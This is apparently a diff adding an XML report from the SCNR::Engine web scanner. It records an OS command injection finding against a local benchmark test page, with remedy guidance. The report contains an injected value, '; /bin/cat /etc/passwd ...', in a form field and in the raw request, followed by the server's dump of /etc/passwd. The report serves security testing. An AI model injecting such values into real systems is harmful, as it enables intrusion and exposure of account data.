@@ -1,0 +1,861 @@
+<?xml version="1.0"?>
+<report xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="https://raw.githubusercontent.com/placeholder/scnr/engine/v1.0dev/components/reporters/xml/schema.xsd">
+    <version>1.0dev</version>
+    <status>done</status>
+    <seed>11111111111111111111111111111111</seed>
+    <options>---
+        audit:
+        parameter_values: true
+        mode: moderate
+        exclude_vector_patterns: []
+        include_vector_patterns: []
+        link_templates: []
+        links: true
+        forms: true
+        cookies: true
+        ui_inputs: true
+        ui_forms: true
+        jsons: true
+        xmls: true
+        datastore: {}
+        device:
+        visible: false
+        width: 1600
+        height: 1200
+        user_agent: Mozilla/5.0 (Gecko) SCNR::Engine/v1.0dev
+        pixel_ratio: 1.0
+        touch: false
+        dom:
+        engine: chrome
+        local_storage: {}
+        session_storage: {}
+        wait_for_elements: {}
+        pool_size: 6
+        job_timeout: 120
+        worker_time_to_live: 1000
+        wait_for_timers: false
+        http:
+        request_timeout: 20000
+        request_redirect_limit: 5
+        request_concurrency: 10
+        request_queue_size: 50
+        request_headers: {}
+        response_max_size: 500000
+        cookies: {}
+        authentication_type: auto
+        input:
+        values: {}
+        default_values:
+        name: scnr_engine_name
+        user: scnr_engine_user
+        usr: scnr_engine_user
+        pass: 5543!%scnr_engine_secret
+        txt: scnr_engine_text
+        num: '132'
+        amount: '100'
+        mail: scnr_engine@email.gr
+        account: '12'
+        id: '1'
+        without_defaults: false
+        force: false
+        exclude_path_patterns: []
+        exclude_content_patterns: []
+        include_path_patterns: []
+        restrict_paths: []
+        extend_paths: []
+        url_rewrites: {}
+        session: {}
+        timeout: {}
+        checks:
+        - "*"
+        platforms: []
+        plugins: {}
+        no_fingerprinting: false
+        authorized_by:
+        url: https://localhost:8443/benchmark/cmdi-Index.html
+    </options>
+    <start_datetime>2024-01-01T00:00:00+01:00</start_datetime>
+    <finish_datetime>2024-01-01T12:34:56+01:00</finish_datetime>
+    <issues>
+        <issue>
+            <name>Operating system command injection</name>
+            <description>
+                To perform specific actions from within a web application, it is occasionally
+                required to run Operating System commands and have the output of these commands
+                captured by the web application and returned to the client.
+
+                OS command injection occurs when user supplied input is inserted into one of these
+                commands without proper sanitisation and is then executed by the server.
+
+                Cyber-criminals will abuse this weakness to perform their own arbitrary commands
+                on the server. This can include everything from simple `ping` commands to map the
+                internal network, to obtaining full control of the server.
+
+                SCNR::Engine was able to inject specific Operating System commands and have the output
+                from that command contained within the server response. This indicates that proper
+                input sanitisation is not occurring.
+            </description>
+            <remedy_guidance>
+                It is recommended that untrusted data is never used to form a command to be
+                executed by the OS.
+
+                To validate data, the application should ensure that the supplied value contains
+                only the characters that are required to perform the required action.
+
+                For example, where the form field expects an IP address, only numbers and periods
+                should be accepted. Additionally, all control operators (`&amp;`, `&amp;&amp;`, `|`, `||`,
+                `$`, `\`, `#`) should be explicitly denied and never accepted as valid input by
+                the server.
+            </remedy_guidance>
+            <remedy_code />
+            <severity>high</severity>
+            <check>
+                <name>OS command injection</name>
+                <description>
+                    Tries to find Operating System command injections.
+                </description>
+                <author>Tasos "Zapotek" Laskos &lt;tasos.laskos@gmail.com&gt;</author>
+                <version>0.3.0</version>
+                <shortname>os_cmd_injection</shortname>
+            </check>
+            <cwe>78</cwe>
+            <digest>1059656978</digest>
+            <references>
+                <reference title="OWASP" url="https://www.owasp.org/index.php/OS_Command_Injection" />
+                <reference title="WASC" url="http://projects.webappsec.org/w/page/13246950/OS%20Commanding" />
+            </references>
+            <vector>
+                <class>SCNR::Engine::Element::Form</class>
+                <type>form</type>
+                <url>https://localhost:8443/benchmark/cmdi-03/BenchmarkTest00001.html?BenchmarkTest00001=SafeText</url>
+                <action>https://localhost:8443/benchmark/cmdi-03/BenchmarkTest00001</action>
+                <source>&lt;form action="/benchmark/cmdi-03/BenchmarkTest00001" method="GET" id="FormBenchmarkTest00001"
+                    autocomplete="off"&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;
+                    &lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;br /&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;
+                    &lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;input type="text" id="username" name="username" /&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;
+                    &lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;input type="text" id="password" name="password" value="" /&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;
+                    &lt;br /&gt;
+                    &lt;/label&gt;
+                    &lt;input type="text" id="BenchmarkTest00001" name="BenchmarkTest00001" value="." /&gt;
+                    &lt;/div&gt;
+                    &lt;br /&gt;
+                    &lt;div&gt;
+                    &lt;input type="submit" value="Login" /&gt;
+                    &lt;/div&gt;
+                    &lt;/form&gt; </source>
+                <seed>; /bin/cat /etc/passwd /etc/security/passwd /etc/master.passwd #</seed>
+                <method>get</method>
+                <affected_input_name>BenchmarkTest00001</affected_input_name>
+                <inputs>
+                    <input name="username" value="scnr_engine_name" />
+                    <input name="password" value="5543!%scnr_engine_secret" />
+                    <input name="BenchmarkTest00001" value="; /bin/cat /etc/passwd /etc/security/passwd /etc/master.passwd #" />
+                </inputs>
+                <default_inputs>
+                    <input name="username" value="" />
+                    <input name="password" value="" />
+                    <input name="BenchmarkTest00001" value="." />
+                </default_inputs>
+            </vector>
+            <remarks />
+            <page>
+                <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+                    "http://www.w3.org/TR/html4/loose.dtd"&gt;
+                    &lt;html&gt;
+                    &lt;head&gt;
+                    &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+                    &lt;/head&gt;
+                    &lt;body&gt;
+                    &lt;p&gt;
+                    Here is the standard output of the
+                    command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;root&amp;#x3a;x&amp;#x3a;0&amp;#x3a;0&amp;#x3a;root&amp;#x3a;&amp;#x2f;root&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;daemon&amp;#x3a;x&amp;#x3a;1&amp;#x3a;1&amp;#x3a;daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;bin&amp;#x3a;x&amp;#x3a;2&amp;#x3a;2&amp;#x3a;bin&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sys&amp;#x3a;x&amp;#x3a;3&amp;#x3a;3&amp;#x3a;sys&amp;#x3a;&amp;#x2f;dev&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sync&amp;#x3a;x&amp;#x3a;4&amp;#x3a;65534&amp;#x3a;sync&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;bin&amp;#x2f;sync&lt;br&gt;games&amp;#x3a;x&amp;#x3a;5&amp;#x3a;60&amp;#x3a;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;man&amp;#x3a;x&amp;#x3a;6&amp;#x3a;12&amp;#x3a;man&amp;#x3a;&amp;#x2f;var&amp;#x2f;cache&amp;#x2f;man&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;lp&amp;#x3a;x&amp;#x3a;7&amp;#x3a;7&amp;#x3a;lp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;lpd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;mail&amp;#x3a;x&amp;#x3a;8&amp;#x3a;8&amp;#x3a;mail&amp;#x3a;&amp;#x2f;var&amp;#x2f;mail&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;news&amp;#x3a;x&amp;#x3a;9&amp;#x3a;9&amp;#x3a;news&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;news&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;uucp&amp;#x3a;x&amp;#x3a;10&amp;#x3a;10&amp;#x3a;uucp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;uucp&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;proxy&amp;#x3a;x&amp;#x3a;13&amp;#x3a;13&amp;#x3a;proxy&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;www-data&amp;#x3a;x&amp;#x3a;33&amp;#x3a;33&amp;#x3a;www-data&amp;#x3a;&amp;#x2f;var&amp;#x2f;www&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;backup&amp;#x3a;x&amp;#x3a;34&amp;#x3a;34&amp;#x3a;backup&amp;#x3a;&amp;#x2f;var&amp;#x2f;backups&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;list&amp;#x3a;x&amp;#x3a;38&amp;#x3a;38&amp;#x3a;Mailing
+                    List Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;list&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;irc&amp;#x3a;x&amp;#x3a;39&amp;#x3a;39&amp;#x3a;ircd&amp;#x3a;&amp;#x2f;run&amp;#x2f;ircd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;gnats&amp;#x3a;x&amp;#x3a;41&amp;#x3a;41&amp;#x3a;Gnats
+                    Bug-Reporting System &amp;#x28;admin&amp;#x29;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gnats&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;nobody&amp;#x3a;x&amp;#x3a;65534&amp;#x3a;65534&amp;#x3a;nobody&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;_apt&amp;#x3a;x&amp;#x3a;100&amp;#x3a;65534&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-network&amp;#x3a;x&amp;#x3a;101&amp;#x3a;102&amp;#x3a;systemd
+                    Network
+                    Management,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-resolve&amp;#x3a;x&amp;#x3a;102&amp;#x3a;103&amp;#x3a;systemd
+                    Resolver,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;messagebus&amp;#x3a;x&amp;#x3a;103&amp;#x3a;104&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-timesync&amp;#x3a;x&amp;#x3a;104&amp;#x3a;105&amp;#x3a;systemd
+                    Time Synchronization,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;bench&amp;#x3a;x&amp;#x3a;1000&amp;#x3a;1000&amp;#x3a;&amp;#x3a;&amp;#x2f;home&amp;#x2f;bench&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;&lt;br&gt;Here
+                    is the std err of the command (if any):&lt;br&gt;&amp;#x2f;bin&amp;#x2f;cat&amp;#x3a; &amp;#x2f;etc&amp;#x2f;security&amp;#x2f;passwd&amp;#x3a;
+                    No such file or
+                    directory&lt;br&gt;&amp;#x2f;bin&amp;#x2f;cat&amp;#x3a; &amp;#x2f;etc&amp;#x2f;master.passwd&amp;#x3a;
+                    No such file or directory&lt;br&gt; </body>
+                <request>
+                    <url>https://localhost:8443/benchmark/cmdi-03/BenchmarkTest00001</url>
+                    <method>get</method>
+                    <parameters>
+                        <parameter name="username" value="scnr_engine_name" />
+                        <parameter name="password" value="5543!%scnr_engine_secret" />
+                        <parameter name="BenchmarkTest00001" value="; /bin/cat /etc/passwd /etc/security/passwd /etc/master.passwd #" />
+                    </parameters>
+                    <headers>
+                        <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" />
+                        <header name="User-Agent" value="Mozilla/5.0 (Gecko) SCNR::Engine/v1.0dev" />
+                        <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6" />
+                        <header name="X-Scnr-Engine-Scan-Seed" value="926e62f45c1be4f56f792af24d80a53d" />
+                        <header name="X-Scnr-Introspector-Taint" value="926e62f45c1be4f56f792af24d80a53d" />
+                        <header name="X-Scnr-Introspector-Trace" value="160887" />
+                    </headers>
+                    <body />
+                    <raw>GET /benchmark/cmdi-03/BenchmarkTest00001?username=scnr_engine_name&amp;password=5543%21%25scnr_engine_secret&amp;BenchmarkTest00001=%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd%20%2Fetc%2Fsecurity%2Fpasswd%20%2Fetc%2Fmaster.passwd%20%23
+                        HTTP/1.1&#xD;
+                        Host: localhost:8443&#xD;
+                        Accept-Encoding: gzip, deflate&#xD;
+                        User-Agent: Mozilla/5.0 (Gecko) SCNR::Engine/v1.0dev&#xD;
+                        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+                        Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+                        X-Scnr-Engine-Scan-Seed: 926e62f45c1be4f56f792af24d80a53d&#xD;
+                        X-Scnr-Introspector-Taint: 926e62f45c1be4f56f792af24d80a53d&#xD;
+                        X-Scnr-Introspector-Trace: 160887&#xD;
+                        &#xD; </raw>
+                </request>
+                <response>
+                    <url>https://localhost:8443/benchmark/cmdi-03/BenchmarkTest00001?username=scnr_engine_name&amp;password=5543!%scnr_engine_secretBenchmarkTest00001=%20/bin/cat%20/etc/passwd%20/etc/security/passwd%20/etc/master.passwd%20%23</url>
+                    <code>200</code>
+                    <ip_address>127.0.0.1</ip_address>
+                    <time>0.0052</time>
+                    <return_code>ok</return_code>
+                    <return_message>No error</return_message>
+                    <headers>
+                        <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com" />
+                        <header name="Cache-Control" value="no-cache, no-store, must-revalidate" />
+                        <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains" />
+                        <header name="X-Frame-Options" value="DENY" />
+                        <header name="X-Content-Type-Options" value="nosniff" />
+                        <header name="Content-Type" value="text/html;charset=UTF-8" />
+                        <header name="Content-Length" value="3341" />
+                        <header name="Date" value="Sat, 13 Jan 2024 03:51:00 GMT" />
+                    </headers>
+                    <body>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+                        "http://www.w3.org/TR/html4/loose.dtd"&gt;
+                        &lt;html&gt;
+                        &lt;head&gt;
+                        &lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
+                        &lt;/head&gt;
+                        &lt;body&gt;
+                        &lt;p&gt;
+                        Here is the standard output of the
+                        command:&lt;br&gt;benchmarkDataBase.lck&lt;br&gt;benchmarkDataBase.log&lt;br&gt;benchmarkDataBase.properties&lt;br&gt;benchmarkDataBase.script&lt;br&gt;benchmarkDataBase.tmp&lt;br&gt;common&lt;br&gt;conf&lt;br&gt;logs&lt;br&gt;shared&lt;br&gt;temp&lt;br&gt;testfiles&lt;br&gt;webapps&lt;br&gt;work&lt;br&gt;root&amp;#x3a;x&amp;#x3a;0&amp;#x3a;0&amp;#x3a;root&amp;#x3a;&amp;#x2f;root&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;daemon&amp;#x3a;x&amp;#x3a;1&amp;#x3a;1&amp;#x3a;daemon&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;bin&amp;#x3a;x&amp;#x3a;2&amp;#x3a;2&amp;#x3a;bin&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sys&amp;#x3a;x&amp;#x3a;3&amp;#x3a;3&amp;#x3a;sys&amp;#x3a;&amp;#x2f;dev&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;sync&amp;#x3a;x&amp;#x3a;4&amp;#x3a;65534&amp;#x3a;sync&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;bin&amp;#x2f;sync&lt;br&gt;games&amp;#x3a;x&amp;#x3a;5&amp;#x3a;60&amp;#x3a;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;games&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;man&amp;#x3a;x&amp;#x3a;6&amp;#x3a;12&amp;#x3a;man&amp;#x3a;&amp;#x2f;var&amp;#x2f;cache&amp;#x2f;man&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;lp&amp;#x3a;x&amp;#x3a;7&amp;#x3a;7&amp;#x3a;lp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;lpd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;mail&amp;#x3a;x&amp;#x3a;8&amp;#x3a;8&amp;#x3a;mail&amp;#x3a;&amp;#x2f;var&amp;#x2f;mail&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;news&amp;#x3a;x&amp;#x3a;9&amp;#x3a;9&amp;#x3a;news&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;news&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;uucp&amp;#x3a;x&amp;#x3a;10&amp;#x3a;10&amp;#x3a;uucp&amp;#x3a;&amp;#x2f;var&amp;#x2f;spool&amp;#x2f;uucp&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;proxy&amp;#x3a;x&amp;#x3a;13&amp;#x3a;13&amp;#x3a;proxy&amp;#x3a;&amp;#x2f;bin&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;www-data&amp;#x3a;x&amp;#x3a;33&amp;#x3a;33&amp;#x3a;www-data&amp;#x3a;&amp;#x2f;var&amp;#x2f;www&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;backup&amp;#x3a;x&amp;#x3a;34&amp;#x3a;34&amp;#x3a;backup&amp;#x3a;&amp;#x2f;var&amp;#x2f;backups&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;list&amp;#x3a;x&amp;#x3a;38&amp;#x3a;38&amp;#x3a;Mailing
+                        List Manager&amp;#x3a;&amp;#x2f;var&amp;#x2f;list&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;irc&amp;#x3a;x&amp;#x3a;39&amp;#x3a;39&amp;#x3a;ircd&amp;#x3a;&amp;#x2f;run&amp;#x2f;ircd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;gnats&amp;#x3a;x&amp;#x3a;41&amp;#x3a;41&amp;#x3a;Gnats
+                        Bug-Reporting System &amp;#x28;admin&amp;#x29;&amp;#x3a;&amp;#x2f;var&amp;#x2f;lib&amp;#x2f;gnats&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;nobody&amp;#x3a;x&amp;#x3a;65534&amp;#x3a;65534&amp;#x3a;nobody&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;_apt&amp;#x3a;x&amp;#x3a;100&amp;#x3a;65534&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-network&amp;#x3a;x&amp;#x3a;101&amp;#x3a;102&amp;#x3a;systemd
+                        Network
+                        Management,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-resolve&amp;#x3a;x&amp;#x3a;102&amp;#x3a;103&amp;#x3a;systemd
+                        Resolver,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;messagebus&amp;#x3a;x&amp;#x3a;103&amp;#x3a;104&amp;#x3a;&amp;#x3a;&amp;#x2f;nonexistent&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;systemd-timesync&amp;#x3a;x&amp;#x3a;104&amp;#x3a;105&amp;#x3a;systemd
+                        Time Synchronization,,,&amp;#x3a;&amp;#x2f;run&amp;#x2f;systemd&amp;#x3a;&amp;#x2f;usr&amp;#x2f;sbin&amp;#x2f;nologin&lt;br&gt;bench&amp;#x3a;x&amp;#x3a;1000&amp;#x3a;1000&amp;#x3a;&amp;#x3a;&amp;#x2f;home&amp;#x2f;bench&amp;#x3a;&amp;#x2f;bin&amp;#x2f;bash&lt;br&gt;&lt;br&gt;Here
+                        is the std err of the command (if any):&lt;br&gt;&amp;#x2f;bin&amp;#x2f;cat&amp;#x3a; &amp;#x2f;etc&amp;#x2f;security&amp;#x2f;passwd&amp;#x3a;
+                        No such file or
+                        directory&lt;br&gt;&amp;#x2f;bin&amp;#x2f;cat&amp;#x3a; &amp;#x2f;etc&amp;#x2f;master.passwd&amp;#x3a;
+                        No such file or directory&lt;br&gt; </body>
+                    <raw_headers>HTTP/1.1 200 &#xD;
+                        Content-Security-Policy: frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline'
+                        'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self'
+                        fonts.googleapis.com; font-src 'self' fonts.gstatic.com&#xD;
+                        Cache-Control: no-cache, no-store, must-revalidate&#xD;
+                        Strict-Transport-Security: max-age=31536000;includeSubDomains&#xD;
+                        X-Frame-Options: DENY&#xD;
+                        X-Content-Type-Options: nosniff&#xD;
+                        Content-Type: text/html;charset=UTF-8&#xD;
+                        Content-Length: 3341&#xD;
+                        Date: Sat, 13 Jan 2024 03:51:00 GMT&#xD;
+                        &#xD; </raw_headers>
+                </response>
+                <dom>
+                    <url>https://localhost:8443/benchmark/cmdi-03/BenchmarkTest00001?username=scnr_engine_name&amp;password=5543!%scnr_engine_secret&amp;BenchmarkTest00001=;%20/bin/cat%20/etc/passwd%20/etc/security/passwd%20/etc/master.passwd%20%23</url>
+                    <transitions />
+                    <data_flow_sinks />
+                    <execution_flow_sinks />
+                </dom>
+            </page>
+            <referring_page>
+                <body>&lt;!DOCTYPE html&gt;
+                    &lt;html lang="en-US"&gt;
+                    &lt;head&gt;
+                    &lt;meta charset="utf-8"&gt;
+                    &lt;script src="/benchmark/js/jquery.min.js" type="text/javascript"&gt;&lt;/script&gt;
+                    &lt;script type="text/javascript" src="/benchmark/js/js.cookie.js"&gt;&lt;/script&gt;
+                    &lt;script src="/benchmark/js/testsuiteutils.js" type="text/javascript"&gt;&lt;/script&gt;
+                    &lt;link rel="icon" type="image/png" href="/benchmark/favicon.ico"&gt;
+                    &lt;title&gt;BenchmarkTest00001&lt;/title&gt;
+                    &lt;/head&gt;
+                    &lt;body&gt;
+                    &lt;form action="/benchmark/cmdi-03/BenchmarkTest00001" method="GET" id="FormBenchmarkTest00001"
+                    autocomplete="off"&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;Please enter your details:&lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;br&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;Username:&lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;input type="text" id="username" name="username"&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;Password:&lt;/label&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;input type="text" id="password" name="password" value=""&gt;
+                    &lt;/div&gt;
+                    &lt;div&gt;&amp;nbsp;&lt;/div&gt;
+                    &lt;div&gt;
+                    &lt;label&gt;Parameter: BenchmarkTest00001 &lt;br&gt;Value:
+                    &lt;/label&gt; &lt;input type="text" id="BenchmarkTest00001" name="BenchmarkTest00001" value="."&gt;
+                    &lt;/div&gt;
+                    &lt;br&gt;
+                    &lt;div&gt;
+                    &lt;input type="submit" value="Login"&gt;
+                    &lt;/div&gt;
+                    &lt;/form&gt;
+                    &lt;/body&gt;
+                    &lt;/html&gt; </body>
+                <request>
+                    <url>https://localhost:8443/benchmark/cmdi-03/BenchmarkTest00001.html?BenchmarkTest00001=SafeText
+                    </url>
+                    <method>get</method>
+                    <parameters />
+                    <headers>
+                        <header name="Accept" value="text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" />
+                        <header name="User-Agent" value="Mozilla/5.0 (Gecko) SCNR::Engine/v1.0dev" />
+                        <header name="Accept-Language" value="en-US,en;q=0.8,he;q=0.6" />
+                        <header name="X-Scnr-Engine-Scan-Seed" value="926e62f45c1be4f56f792af24d80a53d" />
+                        <header name="X-Scnr-Introspector-Taint" value="926e62f45c1be4f56f792af24d80a53d" />
+                        <header name="X-Scnr-Introspector-Trace" value="158802" />
+                    </headers>
+                    <body />
+                    <raw>GET /benchmark/cmdi-03/BenchmarkTest00001.html?BenchmarkTest00001=SafeText HTTP/1.1&#xD;
+                        Host: localhost:8443&#xD;
+                        Accept-Encoding: gzip, deflate&#xD;
+                        User-Agent: Mozilla/5.0 (Gecko) SCNR::Engine/v1.0dev&#xD;
+                        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#xD;
+                        Accept-Language: en-US,en;q=0.8,he;q=0.6&#xD;
+                        X-Scnr-Engine-Scan-Seed: 926e62f45c1be4f56f792af24d80a53d&#xD;
+                        X-Scnr-Introspector-Taint: 926e62f45c1be4f56f792af24d80a53d&#xD;
+                        X-Scnr-Introspector-Trace: 158802&#xD;
+                        &#xD; </raw>
+                </request>
+                <response>
+                    <url>https://localhost:8443/benchmark/cmdi-03/BenchmarkTest00001.html?BenchmarkTest00001=SafeText
+                    </url>
+                    <code>200</code>
+                    <ip_address>127.0.0.1</ip_address>
+                    <time>0.0019</time>
+                    <return_code>ok</return_code>
+                    <return_message>No error</return_message>
+                    <headers>
+                        <header name="Content-Security-Policy" value="frame-ancestors 'self'; form-action 'self'; default-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; style-src-elem 'self' fonts.googleapis.com; font-src 'self' fonts.gstatic.com" />
+                        <header name="Cache-Control" value="no-cache, no-store, must-revalidate" />
+                        <header name="Strict-Transport-Security" value="max-age=31536000;includeSubDomains" />
+                        <header name="X-Frame-Options" value="DENY" />
+                        <header name="X-Content-Type-Options" value="nosniff" />
+                        <header name="Accept-Ranges" value="bytes" />
+                        <header name="Etag" value="W/&quot;1279-1704958566000&quot;" />
+                        <header name="Last-Modified" value="Thu, 01 Jan 2024 07:36:06 GMT" />
+                        <header name="Content-Type" value="text/html;charset=UTF-8" />
+                        <header name="Content-Length" value="1279" />
+                        <header name="Date" value="Sat, 13 Jan 2024 03:50:54 GMT" />
+                    </headers>
+                    <body>&lt;!DOCTYPE html&gt;
+                        &lt;html lang="en-US"&gt;
+                        &lt;head&gt;
+                        &lt;meta charset="utf-8"&gt;
+                        &lt;script src="/benchmark/js/jquery.min.js" type="text/javascript"&gt;&lt;/script&gt;
+                        &lt;script type="text/javascript" src="/benchmark/js/js.cookie.js"&gt;&lt;/script&gt;
+                        &lt;script src="/benchmark/js/testsuiteutils.js" type="text/javascript"&gt;&lt;/script&gt;
+                        &lt;link rel="icon" type="image/png" href="/benchmark/favicon.ico"&gt;
+                        &lt;title&gt;BenchmarkTest00001&lt;/title&gt;
+                        &lt;/head&gt;
+                        &lt;body&gt;
+                        &lt;form action="/benchmark/cmdi-03/BenchmarkTest00001" method="GET" id="FormBenchmarkTest00001"
